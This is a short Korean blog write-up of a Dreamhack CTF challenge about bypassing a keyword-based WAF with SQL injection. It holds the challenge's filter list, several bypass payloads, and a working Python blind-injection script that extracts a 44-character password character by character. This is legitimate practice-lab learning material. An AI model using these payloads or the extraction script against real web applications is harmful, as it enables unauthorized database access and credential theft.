---
layout: post
title: "sql injection bypass WAF advanced"
categories: [Web Hacking]
tags: [SQL Injection, WAF, Bypass, Python]
last_modified_at: 2024-01-11
---

```sql
keywords = ['union', 'select', 'from', 'and', 'or', 'admin', ' ', '*', '/', 
            '\n', '\r', '\t', '\x0b', '\x0c', '-', '+']
def check_WAF(data):
    for keyword in keywords:
        if keyword in data.lower():
            return True

    return False
```

방화벽 키워드  
?uid=' || uid=0x61646d696e0a  
여기서 공백을 우회해줘야 하는데...  
%a0?  
?uid='%a0||%a0uid=0x61646d696e0a  
이건 아예 서버 나감  

char(0x2f,0x2a,0x2a,0x2f)  
?uid='chr(0x2f,0x2a,0x2a,0x2f)||chr(0x2f,0x2a,0x2a,0x2f)uid=0x61646d696e0a  
얘도 서버 나감  

?uid='||length(upw)>10;#'

![Image 1](https://blog.kakaocdn.net/dna/wXu1p/btsDlohLoEB/AAAAAAAAAAAAAAAAAAAAAPip7BVjNJXYmMdkSNN_vcvZdPay28ZmE_fyQLAxCrkT/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1769871599&allow_ip=&allow_referer=&signature=FXFjELg43i8Gl7BgTAWPfXGKAnA%3D)

![Image 2](https://blog.kakaocdn.net/dna/E0Klu/btsDkzD2n0I/AAAAAAAAAAAAAAAAAAAAANjLpXczcp6rk9i07IeXqDCIkGvrKv_woRU9xLlOhGtP/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1769871599&allow_ip=&allow_referer=&signature=%2FQG5Hn0etElcWTf%2BCZklCSeQON4%3D)

upw길이 44  

```python
import requests
import string
import sys
from urllib.parse import urljoin
from urllib import parse 
from requests import get

host = 'http://host3.dreamhack.games:23172/'

password_length = 44; #패스워드 길이
password = "" # 비밀번호(flag)
url=host+'?uid=%27||'
char=string.digits+string.ascii_letters

for i in range(1, 45): #pw 길이만큼 반복 
    for j in char:
        param="ascii(mid(upw,"+str(i)+",1))="+str(ord(j))+";%23"
        URL=url+param
        response=requests.get(URL)
        if response.text.find("admin")>0:
            print(j)
            password+=j
            break

print(password)
```

저번 파이썬 코드랑 똑같음  
왜 advanced인거지..?  
